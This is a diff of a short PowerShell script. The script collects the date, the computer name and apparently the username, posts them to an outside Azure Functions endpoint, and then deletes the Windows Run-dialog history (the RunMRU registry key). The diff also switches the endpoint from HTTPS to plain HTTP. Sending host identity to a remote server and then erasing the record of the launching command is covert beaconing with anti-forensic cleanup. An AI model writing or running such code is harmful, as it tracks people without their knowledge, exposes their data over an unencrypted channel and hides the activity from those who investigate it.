@@ -1,5 +1,4 @@
 try {
-    # ("$(Get-Date) $env:USERNAME @ $env:COMPUTERNAME")| Out-File -FilePath C:\Temp\log.txt -Append -Encoding utf8;$file = Get-Content C:\Temp\log.txt;$body = '{"name" : "' + $file + '"}';iwr -uri "http://jeffc-lt2:7071/api/PJX" -Body $body -Method PO
     $data = [PSCustomObject]@{
         Date     = Get-Date
         Computer = $env:COMPUTERNAME
@@ -10,7 +9,7 @@ try {
         Name = $data
     }
 
-    Invoke-WebRequest -Method Post -Uri "https://pjx.azurewebsites.net/api/pjx" -Body ($body | ConvertTo-Json)
+    Invoke-WebRequest -Method Post -Uri "http://pjx.azurewebsites.net/api/pjx" -Body ($body | ConvertTo-Json)
     Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
 }
 catch {
